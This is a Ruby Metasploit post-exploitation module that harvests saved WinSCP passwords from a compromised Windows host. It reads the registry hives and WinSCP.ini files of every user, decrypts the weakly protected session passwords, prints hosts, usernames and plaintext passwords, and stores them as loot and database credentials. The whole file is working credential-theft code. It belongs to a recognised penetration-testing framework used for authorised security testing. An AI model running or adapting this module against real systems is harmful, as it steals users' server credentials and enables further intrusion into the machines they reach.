##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/parser/ini'
require 'rex/parser/winscp'
require 'msf/core/auxiliary/report'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Auxiliary::Report
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::File
  include Rex::Parser::WinSCP

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Windows Gather WinSCP Saved Password Extraction',
      'Description'   => %q{
        This module extracts weakly encrypted saved passwords from
        WinSCP. It searches for saved sessions in the Windows Registry
        and the WinSCP.ini file. It cannot decrypt passwords if a master
        password is used.
        },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'theLightCosine'],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))
  end

  def get_reg
    # Enumerate all the SID in HKEY_Users and see if any of them have WinSCP RegistryKeys.
    regexists = 0

    userhives=load_missing_hives()
    userhives.each do |hive|
      next if hive['HKU'] == nil
      master_key = "#{hive['HKU']}\\Software\\Martin Prikryl\\WinSCP 2\\Configuration\\Security"
      masterpw = registry_getvaldata(master_key, 'UseMasterPassword')

      #No WinSCP Keys here
      next if masterpw.nil?

      regexists = 1
      if masterpw == 1
        # Master Password used to add AES256 encryption to stored password
        print_error("User #{hive['HKU']} is using a Master Password, cannot recover passwords")
        next

      else
        # Take a look at any saved sessions
        savedpwds = 0
        session_key = "#{hive['HKU']}\\Software\\Martin Prikryl\\WinSCP 2\\Sessions"
        saved_sessions = registry_enumkeys(session_key)
        next if saved_sessions.nil?
        saved_sessions.each do |saved_session|
          # Skip default settings entry
          next if saved_session == "Default%20Settings"

          active_session = "#{hive['HKU']}\\Software\\Martin Prikryl\\WinSCP 2\\Sessions\\#{saved_session}"
          password = registry_getvaldata(active_session, 'Password')
          # There is no password saved for this session, so we skip it
          next if password == nil

          savedpwds = 1
          portnum = registry_getvaldata(active_session, 'PortNumber')
          if portnum == nil
            # If no explicit port number entry exists, it is set to default port of tcp22
            portnum = 22
          end

          encrypted_password = password
          user = registry_getvaldata(active_session, 'UserName') || ""
          fsprotocol = registry_getvaldata(active_session, 'FSProtocol') || ""
          sname = parse_protocol(fsprotocol)
          host = registry_getvaldata(active_session, 'HostName') || ""

          plaintext = decrypt_password(encrypted_password, "#{user}#{host}")

          winscp_store_config({
            hostname: host,
            username: user,
            password: plaintext,
            portnumber: portnum,
            protocol: sname
          })
        end

        if savedpwds == 0
          print_status("No Saved Passwords found in the Session Registry Keys")
        end
      end
    end

    if regexists == 0
      print_status("No WinSCP Registry Keys found!")
    end
    unload_our_hives(userhives)

  end

  def run
    print_status("Looking for WinSCP.ini file storage...")

    # WinSCP is only x86...
    if sysinfo['Architecture'] == 'x86'
      prog_files_env = 'ProgramFiles'
    else
      prog_files_env = 'ProgramFiles(x86)'
    end
    env = get_envs('APPDATA', prog_files_env, 'USERNAME')

    if env['APPDATA'].nil?
      fail_with(Failure::Unknown, 'Target does not have environment variable APPDATA')
    elsif env[prog_files_env].nil?
      fail_with(Failure::Unknown, "Target does not have environment variable #{prog_files_env}")
    elsif env['USERNAME'].nil?
      fail_with(Failure::Unknown, 'Target does not have environment variable USERNAME')
    end

    user_dir = "#{env['APPDATA']}\\..\\.."
    user_dir << "\\.." if user_dir.include?('Users')

    users = dir(user_dir)
    users.each do |user|
      next if user == "." || user == ".."
      app_data = "#{env['APPDATA'].gsub(env['USERNAME'], user)}\\WinSCP.ini"
      vprint_status("Looking for #{app_data}...")
      get_ini(app_data) if file?(app_data)
    end

    program_files = "#{env[prog_files_env]}\\WinSCP\\WinSCP.ini"

    get_ini(program_files) if file?(program_files)

    print_status("Looking for Registry storage...")
    get_reg
  end

  def get_ini(file_path)
    print_good("WinSCP.ini located at #{file_path}")
    file = read_file(file_path)
    stored_path = store_loot('winscp.ini', 'text/plain', session, file, 'WinSCP.ini', file_path)
    print_good("WinSCP saved to loot: #{stored_path}")
    parse_ini(file).each do |res|
      winscp_store_config(res)
    end
  end

  def winscp_store_config(config)
    begin
      res = client.net.resolve.resolve_host(config[:hostname], AF_INET)
      ip = res[:ip] if res
    rescue Rex::Post::Meterpreter::RequestError => e
      print_error("Unable to store following credentials in database as we are unable to resolve the IP address: #{e}")
    ensure
      print_good("Host: #{config[:hostname]}, IP: #{ip}, Port: #{config[:portnumber]}, Service: #{config[:protocol]}, Username: #{config[:username]}, Password: #{config[:password]}")
    end

    return unless ip

    service_data = {
      address: ip,
      port: config[:portnumber],
      service_name: config[:protocol],
      protocol: 'tcp',
      workspace_id: myworkspace_id,
    }

    credential_data = {
      origin_type: :session,
      session_id: session_db_id,
      post_reference_name: self.refname,
      private_type: :password,
      private_data: config[:password],
      username: config[:username]
    }.merge(service_data)

    credential_core = create_credential(credential_data)

    login_data = {
      core: credential_core,
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_data)

    create_credential_login(login_data)
  end
end
